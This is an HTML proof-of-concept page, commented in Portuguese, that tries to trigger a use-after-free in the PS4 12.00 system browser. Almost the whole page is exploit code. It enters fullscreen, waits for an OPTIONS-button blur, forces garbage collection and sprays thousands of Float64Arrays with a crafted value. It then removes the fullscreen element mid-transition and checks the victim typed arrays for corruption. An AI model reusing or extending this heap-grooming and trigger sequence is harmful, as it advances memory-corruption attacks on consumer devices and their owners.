<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Fullscreen UAF - Manual Trigger (Correto)</title>
</head>
<body>

<h2>PS4 12.00 - UAF (Fluxo Real com OPTIONS)</h2>

<button onclick="start()">1. Enter Fullscreen</button>

<pre id="log" style="background:#111;color:#0f0;padding:10px;height:400px;overflow:auto;"></pre>

<script>
function log(msg) {
    document.getElementById("log").textContent += msg + "\n";
}

let f64, u32, dv;
let victimBuffer;
let fsTarget;
let blurTriggered = false;

function start() {
    log("[*] Criando objetos...");

    // =========================
    // Objetos alvo
    // =========================
    victimBuffer = new ArrayBuffer(0x100);
    f64 = new Float64Array(victimBuffer);
    u32 = new Uint32Array(victimBuffer);
    dv  = new DataView(victimBuffer);

    f64[0] = 13.37;
    u32[2] = 0x1337;
    dv.setUint32(16, 0xdeadbeef, true);

    log("[+] Objetos criados");

    // =========================
    // Elemento fullscreen
    // =========================
    fsTarget = document.createElement("div");
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.background = "black";

    document.body.appendChild(fsTarget);

    fsTarget.webkitRequestFullscreen?.();

    log("[*] Fullscreen ativo");
    log("[*] >>> AGORA APERTE OPTIONS <<<");

    // =========================
    // BLUR REAL (ESSENCIAL)
    // =========================
    window.onblur = function() {
        if (blurTriggered) return;
        blurTriggered = true;

        log("[EVENT] onblur recebido (OPTIONS)");

        // Delay CRÍTICO
        setTimeout(() => {

            log("[*] Janela crítica (~500ms)");

            // =========================
            // GC
            // =========================
            for (let i = 0; i < 10000; i++) {
                new ArrayBuffer(0x2000);
            }

            log("[*] GC executado");

            // =========================
            // Spray
            // =========================
            let spray = [];
            for (let i = 0; i < 4000; i++) {
                let arr = new Float64Array(16);
                arr.fill(2.121995791e-314);
                spray.push(arr);
            }

            log("[*] Spray executado");

            // =========================
            // CHECK
            // =========================
            try {
                log("---- CHECK PRÉ-TRIGGER ----");
                log("[F64] " + f64[0]);
                log("[U32] " + u32[2]);
                log("[DV] " + dv.getUint32(16, true));
            } catch (e) {
                log("[ERRO] " + e);
            }

            // =========================
            // 🔥 TRIGGER REAL
            // =========================
            log("[!!!] TRIGGER: remove + exitFullscreen");

            fsTarget.remove();

            document.webkitExitFullscreen?.();

        }, 500); // ← ESSENCIAL

    };
}
</script>

</body>
</html>
